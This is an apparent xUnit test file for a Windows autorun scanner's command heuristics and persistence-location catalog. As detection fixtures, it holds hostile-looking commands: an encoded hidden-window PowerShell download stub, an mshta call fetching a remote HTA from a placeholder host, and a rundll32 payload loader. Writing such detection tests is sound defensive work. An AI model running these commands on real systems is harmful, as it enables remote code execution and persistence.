using Vacuon.Core.Localization;
using Vacuon.Core.Security;
using Xunit;

namespace Vacuon.Core.Tests;

public class CommandHeuristicsTests
{
    [Theory]
    [InlineData(@"""C:\Program Files\App\app.exe"" --silent", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Program Files\App\app.exe -silent", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Windows\system32\notepad.exe", @"C:\Windows\system32\notepad.exe")]
    public void ExtractTargetPath_HandlesSpacesWithAndWithoutQuotes(string command, string expected)
    {
        Assert.Equal(expected, CommandHeuristics.ExtractTargetPath(command));
    }

    [Theory]
    [InlineData("/UserInstall")]
    [InlineData("-silent")]
    [InlineData("/S")]
    public void ExtractTargetPath_RejectsBareSwitches(string command)
    {
        // Sem esta guarda, entradas nativas do Active Setup viram "autorun órfão".
        Assert.Equal(string.Empty, CommandHeuristics.ExtractTargetPath(command));
    }

    [Theory]
    [InlineData("msv1_0")]
    [InlineData("scecli")]
    [InlineData("{E6FB5E20-DE35-11CF-9C87-00AA005127ED}")]
    [InlineData("IEToEdge BHO")]
    public void LooksLikePath_RejectsNamesAndIdentifiers(string value)
    {
        // Lsa\Authentication Packages guarda NOMES de DLL, não caminhos.
        Assert.False(CommandHeuristics.LooksLikePath(value));
    }

    [Fact]
    public void IsUnderSystemDirectory_RecognizesWindowsAndProgramFiles()
    {
        // Binários do sistema são assinados por catálogo, não com assinatura embutida:
        // cobrar assinatura deles marcaria metade do System32 como suspeito.
        Assert.True(CommandHeuristics.IsUnderSystemDirectory(@"c:\windows\system32\rundll32.exe"));
        Assert.True(CommandHeuristics.IsUnderSystemDirectory(@"c:\program files (x86)\edge\setup.exe"));
        Assert.False(CommandHeuristics.IsUnderSystemDirectory(@"c:\users\joao\appdata\local\temp\x.exe"));
    }

    [Fact]
    public void Evaluate_DoesNotFlagRundll32InsideSystem32()
    {
        // Active Setup do próprio Windows chama rundll32 o tempo todo.
        (Suspicion level, _) = CommandHeuristics.Evaluate(
            @"C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install",
            @"C:\Windows\System32\Rundll32.exe");

        Assert.Equal(Suspicion.Normal, level);
    }

    [Fact]
    public void Evaluate_DoesFlagRundll32OutsideSystem32()
    {
        (Suspicion level, _) = CommandHeuristics.Evaluate(
            @"C:\Users\joao\rundll32.exe payload.dll,Start",
            @"C:\Users\joao\rundll32.exe");

        Assert.True(level >= Suspicion.Suspicious);
    }

    [Fact]
    public void Evaluate_DoesNotFlagAppsInstalledUnderAppData()
    {
        // Chrome, Discord, Opera e Roblox instalam em AppData\Local por padrão.
        // Sinalizar essa pasta gera meia dúzia de alarmes falsos em toda máquina.
        (Suspicion level, _) = CommandHeuristics.Evaluate(
            @"""C:\Users\joao\AppData\Local\Discord\Update.exe"" --processStart Discord.exe",
            @"C:\Users\joao\AppData\Local\Discord\Update.exe");

        Assert.Equal(Suspicion.Normal, level);
    }

    [Fact]
    public void Evaluate_FlagsEncodedPowerShell()
    {
        (Suspicion level, List<string> reasons) = CommandHeuristics.Evaluate(
            "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            null);

        Assert.Equal(Suspicion.HighlySuspicious, level);
        Assert.Contains(reasons, r => r == L.T("heuristic.encodedPowerShell"));
    }

    [Fact]
    public void Evaluate_FlagsHiddenWindow()
    {
        (Suspicion level, _) = CommandHeuristics.Evaluate(@"powershell -w hidden -File C:\x.ps1", null);
        Assert.Equal(Suspicion.HighlySuspicious, level);
    }

    [Fact]
    public void Evaluate_FlagsLivingOffTheLandBinaries()
    {
        (Suspicion level, List<string> reasons) = CommandHeuristics.Evaluate(
            @"mshta.exe http://exemplo.invalido/x.hta", null);

        Assert.Equal(Suspicion.HighlySuspicious, level);
        Assert.Contains(reasons, r => r == L.T("heuristic.lolbin", "mshta.exe"));
    }

    [Fact]
    public void Evaluate_FlagsExecutableInTempFolder()
    {
        (Suspicion level, List<string> reasons) = CommandHeuristics.Evaluate(
            @"C:\Users\joao\AppData\Local\Temp\update.exe",
            @"C:\Users\joao\AppData\Local\Temp\update.exe");

        Assert.True(level >= Suspicion.Suspicious);
        Assert.Contains(reasons, r => r == L.T("heuristic.volatileFolder", @"appdata\local\temp"));
    }

    [Fact]
    public void Evaluate_FlagsNameImitatingSystemBinary()
    {
        (Suspicion level, List<string> reasons) = CommandHeuristics.Evaluate(
            @"C:\Users\joao\svch0st.exe", @"C:\Users\joao\svch0st.exe");

        Assert.Equal(Suspicion.HighlySuspicious, level);
        Assert.Contains(reasons, r => r == L.T("heuristic.impostorName", "svch0st.exe"));
    }

    [Fact]
    public void Evaluate_LeavesOrdinaryAutorunAlone()
    {
        // Um autorun legítimo não pode virar alarme, senão o usuário aprende a ignorar a lista.
        (Suspicion level, _) = CommandHeuristics.Evaluate(
            @"""C:\Program Files\Steam\steam.exe"" -silent",
            @"C:\Program Files\Steam\steam.exe");

        Assert.Equal(Suspicion.Normal, level);
    }

    [Fact]
    public void Normalize_ExpandsEnvironmentVariables()
    {
        string result = CommandHeuristics.Normalize(@"%SystemRoot%\system32\cmd.exe");
        Assert.DoesNotContain("%", result);
        Assert.EndsWith(@"\system32\cmd.exe", result, StringComparison.OrdinalIgnoreCase);
    }
}

public class AutorunLocationsTests
{
    [Fact]
    public void Catalog_CoversTheClassicPersistencePoints()
    {
        var paths = AutorunLocations.All.Select(l => l.DisplayPath).ToList();

        Assert.Contains(paths, p => p.Contains(@"CurrentVersion\Run", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(paths, p => p.Contains("Winlogon", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(paths, p => p.Contains("Image File Execution Options", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(paths, p => p.Contains("Command Processor", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(paths, p => p.Contains(@"Session Manager", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(paths, p => p.Contains(@"Control\Lsa", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void WinlogonShell_DeclaresExplorerAsTheExpectedValue()
    {
        AutorunLocation shell = AutorunLocations.All.Single(
            l => l.SubKey.EndsWith("Winlogon", StringComparison.OrdinalIgnoreCase) && l.ValueName == "Shell");

        Assert.Equal("explorer.exe", shell.ExpectedValue);
    }

    [Fact]
    public void AppInitDlls_IsTreatedAsHighlySuspiciousByDefault()
    {
        // AppInit_DLLs carrega uma DLL em todo processo com user32. Não existe uso
        // legítimo comum; o nível base tem que refletir isso.
        IEnumerable<AutorunLocation> appInit = AutorunLocations.All.Where(l => l.ValueName == "AppInit_DLLs");

        Assert.NotEmpty(appInit);
        Assert.All(appInit, l => Assert.Equal(Suspicion.HighlySuspicious, l.BaseLevel));
    }
}
